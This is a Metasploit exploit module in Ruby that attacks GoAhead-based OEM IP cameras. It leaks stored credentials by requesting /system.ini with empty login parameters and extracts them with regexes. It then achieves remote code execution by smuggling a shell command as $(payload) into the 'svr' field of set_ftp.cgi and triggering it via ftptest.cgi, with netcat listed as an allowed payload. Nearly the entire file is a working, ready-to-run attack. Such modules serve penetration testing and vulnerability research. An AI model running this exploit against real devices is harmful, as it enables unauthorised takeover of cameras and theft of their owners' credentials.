##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Ipcam authenticated remote code execution with creds leak",
      'Description'    => %q{
        This module exploits an authenticated remote code execution in various branded ip cameras based on the same chinese OEM model.
        Those cameras are also vulnerable to a badly implemented check on system.ini file within the embedded GoAhead web server.
        By combining the two vulnerabilities, it is possible to achieve code execution without prior knowledge of any credentials.
        1250+ Cameras models have been found vulnerable so far.
        While the credential leak is pretty reliable, a smaller subset of those cameras have netcat available.
        Others have a smaller payload size or tend to mangle some characters on longer strings.
        Using a generic command payload to start a telnetd or change root password may be more suitable in those cases.
      },
      'License'        => MSF_LICENSE,
      'Author'      =>
        [
          'pierrekim', # Discovery
          'amaloteaux' # msf module
        ],
      'References'     =>
        [
          ['URL', 'https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html'],
          ['URL', 'https://jumpespjump.blogspot.nl/2015/09/how-i-hacked-my-ip-camera-and-found.html'],
          ['CVE', '2017-8225' ] #Pre-Auth Info Leak (credentials) within the custom http server
        ],
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'Space'       => 45,
          'BadChars'    => "\x00\x0a\x0d",
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic netcat-e',
            }
        },
      'Targets'        =>
        [
          ['Automatic Targeting', { 'auto' => true }]
        ],
      'Privileged'     => true,
      'DisclosureDate' => "Apr 25 2017",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('USERNAME', [false, 'Optional http username, setting it will prevent credential leak attempt']),
        OptString.new('PASSWORD', [false, 'Optional http username']),
        OptBool.new('GATHER_CREDS_ONLY', [true, 'Only gather credentials without attempting code exec', false])
      ])
  end

  def check

    vprint_status("Sending check")
    begin
      res = send_request_cgi({
        'uri' => '/',
        'method' => 'GET'
      })
      if res.nil?
        vprint_error("No response from GET request while checking")
        return Exploit::CheckCode::Safe
      end
      if res.code != 401
        vprint_error("Non 401 return code : #{res.code}")
        return Exploit::CheckCode::Safe
      end

      unless res.headers["WWW-Authenticate"] =~ /realm=\"GoAhead\".*opaque=\"5ccc069c403ebaf9f0171e9517f40e41\"/
        if res.headers["WWW-Authenticate"] =~ /realm=\"WIFICAM\".*opaque=\"5ccc069c403ebaf9f0171e9517f40e41\"/
          vprint_warning("Camera may be vunerable : realm=WIFICAM found in the header")
          return Exploit::CheckCode::Vulnerable
        else
          vprint_error("Camera likely invulnerable : Wrong or no WWW-Authenticate header send by the camera")
          return Exploit::CheckCode::Safe
        end
      else
        vprint_good("Camera likely vulnerable : Correct header sent by the camera")
        return Exploit::CheckCode::Vulnerable
      end
    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout
      vprint_error("Error connecting to #{rhost}")
      return Exploit::CheckCode::Unknown
    end
    return Exploit::CheckCode::Unknown
  end

  def exploit

    @creds = []
    @skip_creds_leak = false

    if not datastore["PASSWORD"].nil? and datastore["USERNAME"].nil?
      print_error("Inconsistent options : PASSWORD without USERNAME")
      return
    end

    if datastore["GATHER_CREDS_ONLY"] and not datastore["USERNAME"].nil?
      print_error("Inconsistent options : GATHER_CREDS_ONLY with USERNAME")
      return
    end

    if not datastore["USERNAME"].nil?
      @skip_creds_leak = true
      @creds[0] = {
        "username" => datastore["USERNAME"],
        "password" => datastore["PASSWORD"].nil? ? "" : datastore["PASSWORD"]
      }
    end

    begin
      unless @skip_creds_leak
        vprint_status("Trying to download system.ini")
        res = send_request_cgi({
          'uri' => '/system.ini',
          'method' => 'GET',
          'vars_get' => {
            'loginuse' => '',
            'loginpas' => ''
          }
        })

        if res.nil? then print_error("No response from GET request while retrieving system.ini"); return end
        if res.code != 200 then print_error("Wrong return code while retrieving sysem.ini: #{res.code}"); return end

        data=res.body.force_encoding(Encoding::BINARY)
        loot_name     = 'system.ini'
        #loot_type     = 'text/plain'
        loot_type     = 'application/octet-stream'
        loot_filename = 'system.ini'
        loot_desc     = 'ipcam raw information leak'
        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_filename, loot_desc)
        print_status("#{rhost}:#{rport} - Credentials saved in: #{p}")

        vprint_status("Trying to extract credentials")

        admin_regexp = /\x00{5}admin\x00{27}[\w@#!-]{1,25}\x00{5}/
        blank_admin_regexp = /\x00{1}admin\x00{70}/
        anylogin_regexp = /\x00{5}(?=.{32}[\w@#!-]{1,15}\x00{5})[\w@#!-]{1,15}\x00{1,32}[\w@#!-]{1,15}\x00{5}/

        if data =~ admin_regexp
          credsdata = data.scan(admin_regexp)[0].gsub(/\x00{5}admin[\x00]{1,27}/, "").gsub(/[\x00]{5}$/, "")
          @creds[0] = {}
          @creds[0]["username"] = "admin"
          @creds[0]["password"] = credsdata

        elsif data =~ blank_admin_regexp
          @creds[0] = {}
          @creds[0]["username"] = "admin"
          @creds[0]["password"] = ""

        elsif data =~ anylogin_regexp
          credsdata = data.scan(anylogin_regexp)
          credsdata.length.times do |i|
            tmpcreds = credsdata[i].gsub(/^\x00{5}/, "").gsub(/\x00{5}/, "").gsub(/\x00+/, " ").scan(/[\w@#!-]{2,}/)
            @creds[i] = {}
            @creds[i]["username"] = tmpcreds[0]
            @creds[i]["password"] = tmpcreds[1]
          end
      end

        if @creds.length > 0
          print_good("Found #{@creds.length} possible credentials")
          @creds.each do |c|
            print_good("login : #{c["username"]} / password : #{c["password"]}")
              report_cred(
                ip: rhost,
                port: rport,
                user: c["username"],
                password: c["password"],
                service_name: (ssl ? "https" : "http")
              )
          end
        else
          print_error("Could not automatically extract any credentials from loot file, review it manually")
          return
        end
        if datastore["GATHER_CREDS_ONLY"]
          vprint_status("Stopping due to GATHER_CREDS_ONLY option")
          return
        end
      end

      vprint_status("Trying to trigger code execution with credentials : login : #{@creds[0]["username"]} / password : #{@creds[0]["password"]}")
      res = send_request_cgi({
          'uri' => '/set_ftp.cgi',
          'method' => 'GET',
          'vars_get' => {
            'next_url' => 'ftp.htm',
            'loginuse' => @creds[0]["username"],
            'loginpas' => @creds[0]["password"],
            'svr' => "$(#{payload.encoded.strip})",
            'port' => 21,
            'user' => 'ftp',
            'pwd' => 'ftp',
            'dir'=> '/',
            'mode' => 0,
            'upload_interval' => '0'
          }
        })

      #trigger
      res = send_request_cgi({
        'uri' => '/ftptest.cgi',
        'method' => 'GET',
        'vars_get' => {
          'next_url' => 'test_ftp.htm',
          'loginuse' => @creds[0]["username"],
          'loginpas' => @creds[0]["password"]
        }
      })

    rescue ::Timeout::Error, Rex::ConnectionError, Rex::ConnectionRefused, Rex::HostUnreachable, Rex::ConnectionTimeout
      print_error("Error connecting to #{rhost}")
      return
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end
end

